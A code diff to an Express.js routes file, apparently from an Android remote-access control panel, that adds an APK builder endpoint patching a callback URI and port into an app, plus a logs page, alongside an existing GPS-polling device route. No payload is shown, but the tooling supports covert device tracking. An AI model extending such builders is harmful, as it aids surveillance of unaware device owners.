@@ -140,6 +140,42 @@ routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
     });
 });
 
+routes.get('/builder', isAllowed, (req, res) => {
+    debug.route('APK builder page requested');
+    res.render('builder', {
+        myPort: CONST.control_port
+    });
+});
+
+routes.post('/builder', isAllowed, (req, res) => {
+    debug.route('APK build requested');
+    if (!req.query.uri || !req.query.port) {
+        return res.json({ error: 'URI and Port are required' });
+    }
+
+    apkBuilder.patchAPK(req.query.uri, req.query.port, (err) => {
+        if (err) {
+            debug.route(`APK patch failed: ${err}`);
+            return res.json({ error: err });
+        }
+        apkBuilder.buildAPK((err) => {
+            if (err) {
+                debug.route(`APK build failed: ${err}`);
+                return res.json({ error: err });
+            }
+            debug.route('APK built successfully');
+            res.json({ error: false });
+        });
+    });
+});
+
+routes.get('/logs', isAllowed, (req, res) => {
+    debug.route('Logs page requested');
+    res.render('logs', {
+        logs: logManager.getLogs()
+    });
+});
+
 if (process.env.NODE_ENV === 'development') {
     // Development-only error handler
     routes.use((err, req, res, next) => {
